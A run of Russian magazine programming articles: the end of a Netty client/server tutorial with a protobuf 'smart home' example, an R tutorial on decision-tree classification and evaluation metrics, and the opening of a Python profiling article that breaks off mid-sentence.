К счастью, сокеты можно настроить таким образом, чтобы сразу узнавать, есть
там данные или нет, при чтении и не ждать передачи всех данных при запи-
си. Это так называемые неблокирующие сокеты. Они позволяют одному потоку
взаимодействовать с несколькими клиентами. В Java поддержка неблокирую-
щих сокетов появилась только в версии 1.4 в виде Java NIO. Java NIO перво-
начально расшифровывалось как New IO, но теперь оно уже никакое не новое,
поэтому и называется Non-blocking IO.
   Java NIO состоит из трех главных компонентов: каналов, буферов и селек-
торов.
  Каналы похожи на потоки ввода/вывода (stream) с небольшими отличиями.
Они обеспечивают двухстороннюю передачу данных, в один канал можно и пи-
сать, и читать. Чтение из канала и запись данных происходит асинхронно. Ка-
налы всегда читают данные из буфера и пишут в буфер. Основные реализации
каналов: FileChannel, DatagramChannel, SocketChannel, ServerSocketChannel.
  Буфер представляет собой блок данных в памяти ограниченного размера
и набор методов, облегчающих работу с ним. Буфер можно переключать в ре-
жим чтения и в режим записи. Один канал может работать с несколькими буфе-
рами, что позволяет не копировать данные на разных уровнях обработки. Если
нужно, к примеру, добавить к данным заголовок, достаточно просто создать от-
дельный буфер для него, не копируя при этом сами данные. Основные классы
буферов: ByteBuffer, MappedByteBuffer, CharBuffer, DoubleBuffer и другие.
   Селектор — это компонент, который работает с каналами. В одном селек-
торе можно зарегистрировать несколько каналов, указав, какие именно собы-
тия нужно отслеживать. Бывает четыре вида событий: «соединение с сервером
установлено», «входящее соединение принято», «можно читать данные», «мож-
но писать данные». Метод select блокирует выполнение кода, пока хотя бы в
одном из каналов не произойдет интересующее селектор событие. Есть также
и неблокирующий аналог метода select.





                                                             Сервер
                                                                    с неблокирующими
                                                              сокетами





В Java 7 появилось расширение NIO под названием NIO2. В нем архитектура
взаимодействия с каналами была немного изменена. Теперь стало возможным
получать и отправлять данные асинхронно. Больше не нужно постоянно прове-
рять, не появилось ли новое событие канала. Достаточно запустить операцию
и зарегистрировать слушателя, который узнает о ее выполнении. Либо можно
воспользоваться классом Future. Объект Future моделирует выполняемую опе-
рацию. С его помощью можно проверить, выполнена ли операция или заблоки-
ровать выполнение потока, пока не будет получен результат.
   Таким образом, в Java существует три способа работы с сетевыми клиента-
ми. Netty умеет работать со всеми тремя. Кроме того, Netty успешно борется с
некоторыми проблемами NIO и NIO2. Например, NIO может работать немного
по-разному на разных платформах, так как NIO реализован на низком уровне. И
если какие-то тесты работают в Linux, нет стопроцентной гарантии, что они бу-
дут работать в Windows. NIO2 поддерживается только с седьмой версии Java.
Так что для пользователей шестой Java придется писать свою версию сервера.
Netty же предоставляет единый интерфейс работы с NIO, NIO2 и даже блокиру-
ющими сокетами — просто указываем, какой из фреймворков нужен.
   Использование нескольких буферов для одного канала содержит утечку па-
мяти для некоторых версий седьмой и шестой Java. А обновить Java на сервере
не всегда представляется возможным. В Netty реализованы свои классы буфе-
ров, которые работают исправно.
  Еще одна неприятность может подстерегать пользователей Linux-систем.
Согласно документации, селектор должен ожидать появления события, но из-
за ошибки в системе уведомлений epoll может возникать ситуация, когда се-
лектор выходит из блокировки, даже если событий канала нет. В результате
он начинает лихорадочно проверять каналы в цикле и съедает процессор на
100%. Netty справляется с этой и другими проблемами.
   Netty также избавляет от сложностей асинхронного кода. Рассмотрим, к при-
меру, описанный выше селектор. Метод select может вернуть разнообразные
события (можно писать в канал, можно читать, «клиент присоединился»), чтобы
разобраться в этой мешанине, придется писать огромную if-else конструкцию,
поддерживать которую — еще то веселье. Поэтому в Netty используется пат-
терн реактор. Каждому событию можно назначить свой обработчик. В Netty
этот паттерн получил дальнейшее развитие. Каждому событию можно назна-
чить цепочку обработчиков, выходное значение первого обработчика служит
входным значением второго обработчика и так далее. Это облегчает последо-
вательную обработку информации. К примеру, если клиент присылает сжатые
зашифрованные данные, то первый обработчик разархивирует данные, второй
расшифровывает, а третий уже непосредственно их обрабатывает. Если по-
требуется еще какая-то дополнительная обработка данных, то достаточно про-
сто вставить новый обработчик в эту цепочку.

ОСНОВНЫЕ КОМПОНЕНТЫ NETTY
Приложение  Netty начинается с классов Bootstrap и ServerBootstrap.
Bootstrap занимается инициализацией и конфигурацией инфраструктуры кли-
ента, ServerBootstrap инициализирует сервер.
   За обработку данных отвечают экземпляры ChannelHandler. Обработчи-
ки переводят объекты в бинарные данные и наоборот, а также предоставляют
метод обработки ошибок, которые возникают в процессе. Таким образом, вся
бизнес-логика происходит в обработчике. Обработчики разделяются на два
типа: ChannelInboundHandler и ChannelOutboundHandler. Первый тип для рабо-
ты с входящими данными, второй — с исходящими.
   Когда Netty подключается к серверу или принимает соединение от клиен-
та, он должен знать, как обрабатывать данные, которые принимаются и отсы-
лаются. Инициализацией и конфигурацией обработчиков данных занимается
ChannelInitializer. Он добавляет реализации ChannelHandler к ChannelPipeline.
ChannelPipeline передает данные на обработку всем обработчикам в порядке,
в котором они были добавлены. Каждому последующему обработчику переда-
ются данные, уже обработанные в предыдущем.
   Все операции ввода-вывода для канала выполняются в цикле событий
EventLoop. Несколько циклов событий объединяются в группу EventLoopGroup.
Bootstrap клиента создает один экземпляр EventLoopGroup. ServerBootstrap
для сервера создает два экземпляра EventLoopGroup. Один экземпляр только
принимает соединения от клиентов, второй обрабатывает остальные события:
чтение/запись данных и так далее. Это помогает избежать тайм-аута при под-
ключении к серверу новых клиентов.



                                                       Сервер Netty





Когда канал регистрируется, он привязывается к определенному циклу со-
бытий на все время своего существования. Цикл событий всегда выполняет-
ся в одном и том же потоке, поэтому не нужно заботиться о синхронизации
операций ввода-вывода канала. Поскольку обычно один EventLoop работает
с несколькими каналами, важно не выполнять никаких блокирующих операций
в ChannelHandler. Но если это все же требуется, то Netty предоставляет воз-
можность указать EventExecutorGroup при регистрации канала, EventExecutor
которого будет выполнять все методы ChannelHandler в отдельном потоке, не
нагружая EventLoop канала.
   Все операции в Netty выполняются асинхронно. Это значит, что операция
будет выполнена не сразу, а через некоторое время. Чтобы понять, выполни-
лась операция или нет, Netty предоставляет Future и ChannelFuture. Future по-
зволяет зарегистрировать слушателя, который будет уведомлен о выполнении
операции. ChannelFuture может блокировать выполнение потока до окончания
выполнения операции.

ПРИМЕР РАБОТЫ: «УМНЫЙ ДОМ»
Пришло время самого интересного — посмотреть, насколько удобно этим всем
пользоваться. Напишем небольшое клиент-серверное приложение, исполь-
зуя Netty. Возьмем, к примеру, модную в наше время концепцию умного дома.
Сервер на Netty будет обрабатывать данные с датчиков — клиентов Netty и по-
сылать им нужные команды. Воспользуемся преимуществами ChannelPipeline и
реализуем свой протокол передачи данных между клиентом и сервером.
   Для протокола данных удобнее всего воспользоваться разработкой компа-
нии Google, утилитой protobuf (https://developers.google.com/protocol-buffers/).
Protobuf — это механизм передачи структурированных данных, который не за-
висит от языка программирования или платформы. Нужно только написать кар-
кас протокола передачи данных и сгенерировать специальный класс на нужном
языке программирования.
  Нам понадобятся два вида сообщений. SensorData — сообщение от датчи-
ка, в котором содержится статус, тип датчика и какое-то строковое значение.
Command — сообщение от сервера с кодом команды, которую нужно выполнить.

enum Status {
    OK = 0;
    ERROR = 1;
}
enum SensorType {
    TEMPERATURE = 0;
    MOVEMENT = 1;
    SMOKE = 2;
}
message SensorData {
  required Status status = 1;
  required SensorType sensorType = 2;
  required string message = 3;
}
message Command {
    required uint32 code = 1;
}

Описываем протокол в файле с расширением proto и запускаем команду для
генерации Java-класса:

$ protoc src/net/xakep/netty/smarthouse/data/SensorDataProtocol.
  proto --java_out=src/

Класс работы с нашим протоколом готов. Можно приступать к реализации сер-
вера. Инициализацию сервера выполняет класс ServerBootstrap. Для работы
с клиентами будем использовать неблокирующие сокеты, поэтому новые сое-
динения принимает класс NioEventLoopGroup, а в качестве канала связи ис-
пользуется NioServerSocketChannel. Настройку канала общения с клиентом
выполняет класс SmartHouseServerInitializer.

EventLoopGroup group = new NioEventLoopGroup();
ServerBootstrap b = new ServerBootstrap();
b.group(group)
    .channel(NioServerSocketChannel.class)
    .childHandler(new SmartHouseServerInitializer());

Открываем соединение на нужном порту и вызываем метод sync, который ожи-
дает завершения операции. Метод sync вернет экземпляр ChannelFuture. Ис-
пользуем его, чтобы блокировать выполнение главного потока, пока канал сер-
вера не будет закрыт:

ChannelFuture future = b.bind(PORT).sync();
future.channel().closeFuture().sync();

В конце работы сервера освобождаем ресурсы и потоки, которыми пользовал-
ся цикл событий:

group.shutdownGracefully();

Класс SmartHouseServerInitializer наследуем от ChannelInitializer<So
cketChannel>. В методе initChannel добавляем обработчики входящих и ис-
ходящих данных:

ChannelPipeline p = socketChannel.pipeline();
p.addLast(new ProtobufVarint32FrameDecoder());
p.addLast(new ProtobufDecoder(SensorDataProtocol.SensorData.
                              getDefaultInstance()));
p.addLast(new ProtobufVarint32LengthFieldPrepender());
p.addLast(new ProtobufEncoder());
p.addLast(new SmartHouseServerHandler());

Когда ChannelPipeline получает новые входящие данные, он вызывает по-
следовательно ProtobufVarint32FrameDecoder и ProtobufDecoder (и любые
другие наследники от ChannelInboundHandler), которые преобразуют вход-
ные данные из массива байтов в объект SensorData. Этот объект подается на
вход SmartHouseServerHandler для обработки. Когда в ChannelPipeline по-
ступают исходящие данные, вызываются последовательно ProtobufVarint3
2LengthFieldPrepender и ProtobufEncoder (и любые другие наследники от
ChannelOutboundHandler), которые переводят исходящий объект в байтовые
данные. Подробнее о работе protobuf-обработчиков можно узнать из докумен-
тации Netty.
   Обработчик SmartHouseServerHandler наследован от SimpleChannel-
InboundHandler. SimpleChannelInboundHandler удобно использовать, если
требуется прочитать сообщение определенного типа. В нашем случае это со-
общения типа SensorData. Нам потребуется реализовать три метода. Метод
channelRead0 позволяет обработать полученное сообщение указанного типа.
Для простоты сервер будет просто посылать клиенту команду ничего не делать:

protected void channelRead0(ChannelHandlerContext ctx,
SensorDataProtocol.SensorData sensorData) throws Exception {
    Command.Builder builder = Command.newBuilder().
                              setCode(COMMAND_IDLE);
    ctx.write(builder.build());
}

Метод write записывает исходящие данные в буфер, но не отправляет их клиен-
ту. Для этого служит метод flush, который вызывается в channelReadComplete:

public void channelReadComplete(ChannelHandlerContext ctx) {
     ctx.flush();
}

Для обработки исключений, которые возникают при работе канала, использу-
ется метод exceptionCaught. Для простоты в случае ошибки будем выводить
ее стек и закрывать канал:

public void exceptionCaught(ChannelHandlerContext ctx,
Throwable cause) {
    cause.printStackTrace();
    ctx.close();
}

Теперь займемся клиентом. Для инициализации клиента используется класс
Bootstrap. Настройкой канала соединения с сервером занимается класс
SmartHouseClientInitializer. Клиенту не нужно держать соединение, поэ-
тому после того, как данные отправлены, канал закрывается:

EventLoopGroup group = new NioEventLoopGroup();
try {
    Bootstrap b = new Bootstrap();
    b.group(group)
            .channel(NioSocketChannel.class)
            .handler(new SmartHouseClientInitializer());
    Channel channel = b.connect(HOST, PORT).sync().channel();
    sendData(channel);
    channel.close();
} finally {
    group.shutdownGracefully();
}

Реализация   SmartHouseClientInitializer   похожа   на   реализацию
SmartHouseServerInitializer, только объект мы ожидаем класса Command и
обрабатывать его будет класс SmartHouseClientHandler:

pipeline.addLast(new ProtobufDecoder(SensorDataProtocol.Command.
  getDefaultInstance()));
...
pipeline.addLast(new SmartHouseClientHandler());

SmartHouseClientHandler  тоже  является  наследником  SimpleChannel-
InboundHandler. Для получения данных от сервера воспользуемся блокирую-
щей очередью. Она приостановит выполнение программы, пока в нее не будут
добавлены новые данные:

private final BlockingQueue<SensorDataProtocol.Command> answer =
new LinkedBlockingQueue<SensorDataProtocol.Command>();

protected void channelRead0(ChannelHandlerContext channelHandlerContext,
SensorDataProtocol.Command command) throws Exception {
    answer.add(command);
}

Отправлять данные на сервер будет метод sendUpdate. В нем используется
writeAndFlush, чтобы сразу передать данные в сеть. Метод sendUpdate воз-
вращает полученную от сервера команду:

public SensorDataProtocol.Command sendUpdate(SensorDataProtocol.Status
status, SensorDataProtocol.SensorType sensorType, String message){
    SensorData.Builder builder = SensorData.newBuilder();
    builder.setStatus(status)
           .setSensorType(sensorType)
           .setMessage(message);
    channel.writeAndFlush(builder.build());
    SensorDataProtocol.Command command = answer.take();
    return command;
}

Осталось передать на сервер тестовые данные, например, что температура
дома 23 градуса:

void sendData(Channel channel) {
    SmartHouseClientHandler handler = channel.pipeline().
        get(SmartHouseClientHandler.class);
    SensorDataProtocol.Command command = handler.sendUpdate
      (Status.OK, SensorType.TEMPERATURE, "23");
    ...
}


ВЫВОД
Таким образом, с помощью Netty можно быстро и просто написать любое бы-
строе клиент-серверное приложение, которое к тому же будет легко расши-
ряться и масштабироваться. Если для обработки клиентов не хватает одно-
го потока, следует всего лишь передать нужное число потоков в конструктор
EventLoopGroup. Если на какой-то стадии развития проекта понадобится до-
полнительная обработка данных, не нужно переписывать код, достаточно доба-
вить новый обработчик в ChannelPipeline, что значительно упрощает поддержку
приложения.
   Netty позволяет передавать данные через TCP или UDP, поддерживает мно-
жество протоколов, таких как HTTP, FTP, SMTP, WebSockets, SSL/TLC, SPDY.
API хорошо документирован, на гитхабе выложено множество примеров с под-
робными комментариями. А все возрастающее сообщество свидетельствует о
том, что продукт получился хороший, достойный внимания и активного исполь-
зования.


Полезные ссылки

•  Официальный сайт Netty (netty.io)
•  Хорошая обучалка по NIO (rox-xmlrpc.sourceforge.net/niotut/index.html)
•  Обучалка NIO2 (https://www.ibm.com/developerworks/library/j-nio2-1/)
•  Прекрасный учебник по Netty, все подробно и понятно описано
(www.vterm.cn/wp-content/uploads/2014/09/Netty-In-Action-V5.pdf)
   Кодинг
 Анализ данных
 с использованием R
    Алгоритмы классификации (часть 1):
    деревья решений



                                                                                    Виталий Худобахшов
                                                                                                                     vitaly@betamind.ru





    Сегодня я немного расскажу о решении задачи классификации с использова-
    нием программного пакета R и его расширений. Задача классификации, пожа-
     луй, одна из самых распространенных в анализе данных. Существует множе-
     ство методов для ее решения с использованием разных математических техник,
    но нас с тобой, как апологетов R, не может не радовать, что при этом програм-
    мировать что-либо с нуля не нужно, — все есть (причем далеко не в единствен-
    ном экземпляре) в системе пакетов R.

   ЗАДАЧА КЛАССИФИКАЦИИ
    Задача классификации — типичный пример «обучения с учителем». Как прави-
     ло, мы располагаем данными в виде таблицы, где столбцы содержат значение
    наборов признаков для каждого случая. Причем все строки заранее размече-
    ны таким образом, что один из столбцов (положим, что последний) указывает
    на класс, к которому принадлежит данная строка. Как хороший пример мож-
    но привести задачу классификации писем на спам и не спам. Для того чтобы
     воспользоваться алгоритмами машинного обучения, нужно для начала иметь
    размеченные данные — такие, для которых значение класса известно наряду
     с остальными признаками. Причем набор данных должен быть существенным,
    особенно если количество признаков велико.
       Если у нас есть достаточно данных, то можно начинать обучение модели.
    Общая стратегия с классификаторами не особо зависит от модели и включает
    следующие шаги:
     • выбор тренировочного и тестового множества;
     • обучение модели на тренировочном множестве;
     • проверка модели на тестовом множестве;
     • перекрестная проверка;
     • улучшение модели.

    Точность и полнота
     Как оценить, насколько хорошо работает наш классификатор? Непростой во-
     прос. Дело в том, что различные варианты развития событий возможны, даже
    если у нас есть всего только два класса. Допустим, мы решаем задачу филь-
     трации спама. После проверки модели на тестовом множестве мы получим че-
    тыре величины:
     •  «TP» (true positive) — сколько сообщений было правильно классифицирова-
       но как спам,
     •  «TN» (true negative) — сколько сообщений было правильно классифициро-
       вано как не спам,
     •  «FP» (false positive) — сколько сообщений было неправильно классифици-
       ровано как спам (то есть письма спамом не были, но модель классифици-
       ровала эти сообщения как спам),
     •  «FN» (false negative) — сколько сообщений было неправильно классифици-
       ровано как не спам, а на самом деле это был все-таки Центр американского
        английского.

      В зависимости от деталей решаемой задачи качество модели может быть
    оценено по-разному. В каждом конкретном случае нам нужно выбрать, что важ-
     нее: чтобы в спам попало как можно больше писем, которые на самом деле яв-
    ляются спамом, и мы готовы пожертвовать некоторыми важными сообщениями
    или же чтобы в спам попадали только гарантированно «плохие» сообщения,
    а все остальные сообщения терялись в папке спам как можно реже (наверное,
     у всякого приличного интернетчика хотя бы раз в жизни важное-важное сооб-
    щение пропадало в спаме). Редко удается усидеть на двух стульях, и поэтому
     приходится при выборе классификатора принять решение в пользу той или
    иной стратегии. Как правильно отразить эти два крайних случая с математиче-
     ской точки зрения? Математической реализацией этих двух случаев служат точ-
    ность (precision) и полнота (recall) соответственно. Это сравнительно простые
     характеристики модели, которые определяются следующим образом:
     •  точность «PPV = TP / (TP + FP)»;
     •  полнота «TPR = TP / (TP + FN)».

    Иногда хочется иметь величину, которая бы показывала качество модели в це-
     лом, учитывая и точность и полноту. Для этого можно использовать так называ-
    емую F-меру:

     F1 = 2*TP / (2*TP + FP + FN)

    F-мера представляет собой гармоническое среднее между точностью и полно-
     той. Это означает, что если хотя бы одна из этих двух величин стремится к нулю,
     то и F-мера стремится к нему же. На самом деле описанный вариант учитывает
    и точность, и полноту в равной степени, однако можно корректировать значи-
    мость каждой из величин (см. формулу 1).

              PPV TPR     Fβ = (1 + β2)             ·
              β2PPV + TPR
           Формула 1. Общее определение F-меры с коэффициентом beta,
            который устанавливает значимость полноты в формуле, если beta > 1,
              то полнота важнее, если beta < 1, то важнее точность

   Эффект переобучения
     Бывает, модель «выучивает» те свойства обучающего множества, которые
    не характерны для данных в общем случае, как иногда говорят — отсутствуют
     в генеральной совокупности. Такая модель на реальных данных будет давать
     плохие результаты. Этот феномен известен как переобучение, или overfitting.
    Способы борьбы с переобучением зависят от алгоритма машинного обучения.
    К примеру, для деревьев решений от эффекта переобучения можно избавить-
     ся за счет отсечения некоторых ветвей (см. далее).

    Перекрестная проверка
    Перекрестная проверка, или cross-validation, — это всего лишь метод провер-
     ки модели. Очень часто данные делят тренировочное и тестовое множество
     в соотношении 2: 1. Таким образом, обучают модель на 2/3 данных, а тестиру-
    ют на 1/3. А что будет, если с данными что-то не так? И как понять, что модель
     ведет себя неправильно? Для того чтобы убедиться, что модель работает хо-
    рошо, поступают следующим образом: данные делятся на k частей, из этих ча-
     стей (k – 1) используется для обучения модели, а одна для тестирования. Про-
    цедура повторяется k раз, так, чтобы каждый из семплов использовался для
     тестирования ровно один раз. Такой способ перекрестной проверки известен
     как k-fold. Часто используется 10-fold, но на самом деле нет никаких специаль-
    ных ограничений на k.
       Каждый легко может представить и другие виды перекрестной проверки,
    решающие ту же самую задачу. В целом все методы можно поделить на исчер-
   пывающие (exhaustive) и неисчерпывающие (non-exhaustive). Первые про-
    веряют все возможные варианты для обучения/тестирования, а вторые — лишь
     часть. Ко второму классу можно отнести методы со случайной выборкой типа
    Монте-Карло. Очевидно, что k-fold относится к исчерпывающим методам. Его
    можно усложнить, сделав разбиение на (k – p) и p семплов соответственно.

   ДЕРЕВЬЯ РЕШЕНИЙ
    Теперь можно приступить к практике. Начнем с чего-нибудь интуитивно понят-
     ного.
       Для начала нужно выбрать данные, с которыми мы планируем работать.
    В интернете можно найти огромное количество данных для анализа и обработ-
      ки, но так как цель этой статьи сугубо обучающая, то мы воспользуемся класси-
    ческим источником: существует прекрасная книга An Intoduction to Statistical
     Learning with Application with R, которую легко найти в интернете. Для R есть
    специальный пакет «ISLR», нужно будет установить его перед работой. Также
    нам понадобится пакет «tree», в котором реализован алгоритм работы с дере-
    вьями решений (на самом деле это далеко не единственный пакет для подоб-
    ных задач, чуть позже мы рассмотрим и другие варианты). Для начала подклю-
    чаем все это хозяйство:

     library(ISLR)
     library(tree)
     head(Carseats)
     attach(Carseats)

    Здесь мы будем работать с данными Carseats из пакета ISLR, это учебный ма-
     териал по продажам автокресел в 400 различных магазинах. Для начала по-
    смотрим, что представляет собой этот набор данных:

   Sales CompPrice Income Advertising Population Price ShelveLoc   Age Education Urban  US
1  9.50       138     73          11        276   120       Bad   42        17   Yes  Yes
2 11.22       111     48          16        260    83      Good   65        10   Yes  Yes
3 10.06       113     35          10        269    80    Medium   59        12   Yes  Yes
4  7.40       117    100           4        466    97    Medium   55        14   Yes  Yes
5  4.15       141     64           3        340   128       Bad   38        13   Yes   No
6 10.81       124    113          13        501    72       Bad   78        16    No  Yes

   С помощью «attach» мы делаем колонки обычными переменными, то есть вме-
     сто того, чтобы писать каждый раз «Carseats$Sales», теперь можно просто ука-
     зывать «Sales», что несомненно удобно. Положим, мы хотим просто разделить
     все продажи на высокие и низкие, а затем понять, как признаки в нашей табли-
    це влияют на качество продаж. Подробное описание формата данных можно
     получить обычным способом, просто набрав «?Carseats» в консоли R.
       Сперва надо решить, что считать высокими, а что низкими продажами. Сна-
     чала можно посмотреть, в каком промежутке меняются значения Sales во всем
    объеме данных:

     range(Sales)
     [1] 0.00 16.27

    Положим, что продажи можно считать большими, если значение больше или
    равно 8. Отразим это, добавив соответствующий столбец к нашему фрейму дан-
     ных. Чтобы его создать, можно воспользоваться векторной функцией «ifelse`:

     High = ifelse(Sales >= 8, "Yes", "No")

     Так мы получили отдельный вектор из «Yes» и «No». Теперь его легко присоеди-
     нить к нашему фрейму данных «Carseats». Строго говоря, колонка «Sales» нам
    больше не нужна, и ее можно просто удалить:

     Carseats = Carseats[, —1] # Удаляем Sales
     Carseats = data.frame(Carseats, High) # Добавляем High

    Перед тем как разбить данные на тестовое и тренировочное множество, было бы
    неплохо зафиксировать начальное значение генератора случайных чисел:

     set.seed(3)

    Это сделает наши результаты воспроизводимыми. Если, к примеру, качество
    данных плохое, то при построении и тестировании модели точность и F-мера
     могут значительно различаться, что может быть нежелательно. Теперь разде-
    лим наши данные на тренировочное и тестовое множества в отношении 2:1.
    Это можно сделать с помощью функции «sample»:

     n = nrow(Carseats)
     test = sample(1: n, n/3)
     train = –test

    Теперь «test» — это вектор случайных чисел от 1 до n длины n/3. Так как удалять
     колонки и строки можно, просто используя отрицательные значения индексов,
     то тренировочное и тестовое множество будут выглядеть следующим образом:

     training_set = Carseats[train,]
     testing_set = Carseats[test,]

    Для того чтобы обучить модель, достаточно всего лишь одного вызова:

     tree_model = tree(High~., training_set)

    Здесь «High~.» представляет собой формулу, которая говорит системе, что пе-
    ременная «High» зависит от всех признаков. Иногда бывает полезно визуали-
     зировать модель. Это можно сделать с помощью стандартной функции «plot»:

     plot(tree_model)

     Результатом работы такой функции будет отрисованное дерево решений. В та-
    ком виде оно довольно бесполезно, поэтому соответствующие ветвления нуж-
    но подписать:

     text(tree_model)

     Результат выполнения команды «plot» изборажен на Рис 1.





     Рис. 1. Визуализация полученной модели,
     здесь нет подписей, каждый может
     вызвать функцию text и тогда станет
      понятно, почему :)


    Посмотри на дерево, и тебе станет понятно, что происходит. Алгоритм дает нам
    просто набор условных выражений, посредством которых происходит класси-
     фикация. Теперь можно преступить к проверке модели. Для начала попробуем
    модель на тестовых данных:

     tree_pred = predict(tree_model, testing_set, type="class")
     mean(tree_pred!= High[test])

    Здесь первая строчка строит предсказание на основе модели для тестового
     множества, «type=class’ указывает на то, что мы занимаемся задачей класси-
     фикации. Наверное, самым простым способом проверки модели является про-
     стой подсчет ошибок — функция «mean» даст нам количество ошибок в долях
     от единицы. Здесь это значение равно «0.2481203», что в переводе на русский
     язык означает 24.8 %.
        Кстати, как насчет улучшения результата? Если внимательно посмотреть
    на дерево решений, можно предположить, что мы имеем дело с переобучени-
     ем: некоторые закономерности, которые стали частью модели, на самом деле
    не свойственны тестовому множеству. В случае деревьев это, как правило, оз-
     начает, что высота дерева слишком велика и нужно удалить лишние ветки.
      А как определить, сколько именно ветвей нужно удалять? В этом деле нам
    поможет процедура перекрестной проверки. Средствами R она реализует-
     ся довольно легко:

     set.seed(5)
     cv_tree = cv.tree(tree_model, FUN=prune.misclass)

    В этом (достаточно понятном и без всяких комментариев) коде мы сначала еще
     раз устанавливаем начальное значение для генератора псевдослучайных чи-
     сел. Затем с помощью встроенной функции мы делаем перекрестную провер-
      ку. Результатом будет список «cv_tree», в котором есть поля «size» и «dev`: пер-
    вое — размер дерева (его высота), второе — допуск ошибки. Функция «prune.
     misclass’ — как раз та функция, которая позволит нам сделать отсечение:

     plot(cv_tree$size, cv_tree$dev, type="b")

    Если посмотреть на построенный график зависимости ошибки от размера де-
    рева (см. рис. 2), то видно, что минимум ошибки приходится где-то на 9:


                                            Рис. 2. Результат перекрестной проверки





    Исходя из полученных данных, можно сделать улучшенную модель, сделав от-
    сечение ветвей с помощью той же функции (см. рис. 3):

     prune_model = prune.misclass(tree_model, best=9)





     Рис. 3. Визуалиация дерева
     решений после отсечения



     Часто бывает нужно визуализировать дерево решений прямо в консоли. Для
     этого достаточно просто напечатать модель:

     print(prune_model)
     node), split, n, deviance, yval, (yprob)
     * denotes terminal node
     1) root 267 359.500 No (0.59925 0.40075)
     2) ShelveLoc: Bad, Medium 213 260.400 No (0.69953 0.30047)
     4) Price < 92.5 30 36.650 Yes (0.30000 0.70000) *
     5) Price > 92.5 183 199.500 No (0.76503 0.23497)
     10) CompPrice < 124.5 79 42.460 No (0.92405 0.07595) *
     11) CompPrice > 124.5 104 135.400 No (0.64423 0.35577)
     22) ShelveLoc: Bad 34 15.210 No (0.94118 0.05882) *
     23) ShelveLoc: Medium 70 97.040 Yes (0.50000 0.50000)
     46) Price < 115.5 19 7.835 Yes (0.05263 0.94737) *
     47) Price > 115.5 51 64.920 No (0.66667 0.33333)
     94) Age < 33.5 8 0.000 Yes (0.00000 1.00000) *
     95) Age > 33.5 43 44.120 No (0.79070 0.20930)
     190) Advertising < 15 37 25.350 No (0.89189 0.10811) *
     191) Advertising > 15 6 5.407 Yes (0.16667 0.83333) *
     3) ShelveLoc: Good 54 54.590 Yes (0.20370 0.79630)
     6) Price < 135 46 27.180 Yes (0.08696 0.91304) *
     7) Price > 135 8 6.028 No (0.87500 0.12500) *

    Теперь можно опять проверить работоспособность нашей модели на тестовых
     данных:

     tree_pred1 = predict(prune_model, testing_set, type="class")
     mean(tree_pred1!= High[test])

    Надо сказать, в данном конкретном случае отсечение не очень-то и помогло:
    при данных значениях «seed» получится 24 % вместо 24.8 %. В других случаях
     с помощью этого метода иногда получается добиться лучших результатов (хотя
     как мы увидим дальше, сейчас тоже получилось неплохо).
       Пользуясь случаем, расскажу немного о том, что такое «хорошо» и «плохо».
    На этом этапе я хочу вернуть читателя в реальный мир и показать, насколько
     все на самом деле может быть плохо. Если поменять значение «seed», можно
     получить, например, 30 % — да так, что никакое отсечение не поможет. Все
    дело в данных: здесь мы делаем случайную выборку из не самых лучших дан-
     ных, и поэтому в зависимости от начального значения генератора результат
    может очень сильно меняться. В задачах анализа данных это происходит до-
    вольно часто. Данные редко бывают настолько хороши, чтобы работа с ними
    была сразу приятна, а результаты стабильны и поражали нас значениями точ-
     ности и полноты.
        Кстати, чуть не забыл! Надо бы посчитать соответствующие величины для
     полученных нами только что результатов. Для начала сделаем это для нашей
    оригинальной модели:

     t = table(pred=tree_pred, true=High[test])

    Если вывести ее на консоль, мы увидим:

     true
     pred No Yes
     No 66 23
     Yes 10 34

    Эта таблица как раз и представляет собой вычисленные значения TP, FP, TN,
     FN. Теперь легко написать функцию, которая сможет рассчитывать точность
    и полноту:

     check <- function(res) {
     tn = res[1,1]
     tp = res[2,2]
     fp = res[1,2]
     fn = res[2,1]
     prec <- tp / (tp + fp)
     recall <- tp / (tp + fn)
     f1 <- 2 * tp / (2 * tp + fp + fn)
     list(precision=prec, recall=recall, f1=f1)
     }

     Итак, для оригинальной модели соответствующие значения будут:

     $precision
     [1] 0.5964912
     $recall
     [1] 0.7727273
     $f1
     [1] 0.6732673

    Теперь все то же самое, только уже для модели с отсечением:

     t1 = table(pred=tree_pred1, true=High[test])
     check(t1)

    Несмотря на то, что при использовании «mean» разница между моделями не ка-
     залось уж такой существенной, точность модели возросла более чем на 5 %,
    а F-мера — на 2 %, хотя полнота упала на 2 %:

     $precision
     [1] 0.6491228
     $recall
     [1] 0.755102
     $f1
     [1] 0.6981132

     Итак, когда мы немного разобрались с тем, как решать задачу классификации
     с помощью деревьев решений, настало время рассказать о том, какие еще па-
     кеты доступны для работы с ними. Тем более, что методы визуализации для
     пакета tree, как мы видели выше, не так хороши.

   ВИЗУАЛИЗАЦИЯ ДЕРЕВЬЕВ
    Для начала следует упомянуть пакет «party», который имеет довольно прилич-
    ную систему визуализации (см. рис 4):

     library(party)
     ct = ctree(High~., training_set)
     plot(ct)


     Рис. 4. Визуализация дерева решений
     для пакета party





    Еще один приятный в использовании вариант — это пакет «rpart» и пакет для
     визуализации «rpart.plot`:

     library(rpart)
     library(rpart.plot)
     rp = rpart(High~., training_set)
     prp(rp)





                                                   Рис. 5. Результат работы функции
                                                      prp из пакета rpart.plot





    Если воспользоваться функций «fancyRpartPlot» из пакета «rattle», то можно по-
     лучить прекрасное изображение, как показано на рис 6.

     library(rattle)
     fancyRpartPlot(rp)



     Рис. 6. Результат работы
      fancyRpartPlot





   ВМЕСТО ЗАКЛЮЧЕНИЯ
    В следующих статьях я расскажу, про работу с другими алгоритмами класси-
    фикации (такими как наивный байессовский классификатор и метод опорных
     векторов), а также с нейронными сетями и алгоритмом Random Forest. Более
     того, я немного расскажу про то, как это работает на самом деле.

      Из полезного, в июне начался русскоязычный курс по R на Stepic,
       который называется «Анализ данных в R»
Кодинг
 Python  на стероидах





                Измеряем производительность
                наших приложений без потери
                  скорости в продакшене

  Иван Колодяжный
     e0ne@e0ne.info




Скорость работы приложений в продакшене — всегда горячая тема. Как, не на-
гружая сервер на все сто процентов и не мешая работе пользователей, узнать,
насколько быстро или медленно все работает? Запустив легкий профилиров-
щик, мы легко получим ответы на эти вопросы.
   Когда цена за гигабайт памяти составляет копейки (~0,026 доллара за час
в облаке от Amazone), а современные процессоры работают все быстрее с каж-
дым месяцем, производительность ПО во многих случаях оставляет желать луч-
шего. Ведь часто докупить оперативки и/или процессор оказывается дешевле,
чем тратить многие человеко-месяцы на тестирование и исправление проблем
с производительностью. Но бывает и наоборот — стоит исправить буквально
две строчки кода, как все начинает просто летать. Главное — найти эти самые
